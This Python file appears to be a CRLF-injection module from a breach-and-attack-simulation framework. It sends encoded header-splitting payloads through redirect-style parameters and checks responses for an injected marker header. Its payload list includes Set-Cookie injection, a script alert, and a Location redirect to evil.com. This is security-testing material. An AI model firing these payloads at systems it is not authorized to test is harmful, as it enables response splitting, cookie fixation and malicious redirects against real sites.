"""CRLF Injection testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_CRLF_PAYLOADS = [
    "%0d%0aX-Injected: BAS_CRLF_TEST", "%0aX-Injected: BAS_CRLF_TEST",
    "%0d%0a%0d%0a<script>alert(1)</script>", "\\r\\nX-Injected: BAS_CRLF_TEST",
    "%E5%98%8A%E5%98%8DX-Injected: BAS_CRLF_TEST",  # Unicode CRLF
    "%0d%0aSet-Cookie: BAS_CRLF=injected",
    "%0d%0aLocation: https://evil.com",
]

class CRLFModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="crlf", description="CRLF injection / HTTP response splitting", category="crlf",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-93"], tags=["injection", "crlf", "header"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            p = await self._payload_db.get_payloads("crlf", limit=50)
            if p: return p
        return DEFAULT_CRLF_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        params = options.get("params", ["url", "redirect", "next", "path", "return"])
        return [AttackRequest(request_id=f"crlf-{uuid.uuid4().hex[:8]}", target=target, method="GET",
            path=options.get("path", "/"), params={param: p}, follow_redirects=False,
            headers={"X-BAS-Payload": p[:50]}) for p in payloads for param in params[:3]]

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        if "x-injected" in {k.lower() for k in response.headers} or "BAS_CRLF" in str(response.headers):
            return ModuleResult(module_name="crlf", target=request.target, status=VulnStatus.VULNERABLE,
                payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"CRLF injection: injected header found in response", severity="high", mitre_technique_id="T1190")
        return ModuleResult(module_name="crlf", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
